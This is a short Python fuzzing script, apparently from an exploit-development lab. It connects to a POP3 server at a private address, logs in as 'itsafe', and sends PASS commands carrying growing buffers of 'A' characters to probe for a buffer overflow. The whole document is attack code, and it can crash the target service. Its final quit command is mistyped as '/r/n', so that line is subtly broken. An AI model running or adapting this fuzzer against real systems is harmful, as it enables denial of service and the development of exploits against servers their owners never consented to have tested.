#!/usr/bin/python
import socket

buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter += 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.6.23', 110))
s.recv(1024)
s.send('user itsafe\r\n'.encode('utf-8'))  # Enviando 'user' em letras minúsculas
s.recv(1024)

for string in buffer:
    print("Fuzzing the pass with {} bytes".format(len(string)))
    s.send(('pass ' + str(string) + '\r\n').encode('utf-8'))
    s.recv(1024)

s.send(b"quit/r/n")  # Enviando 'quit' em letras minúsculas
s.close()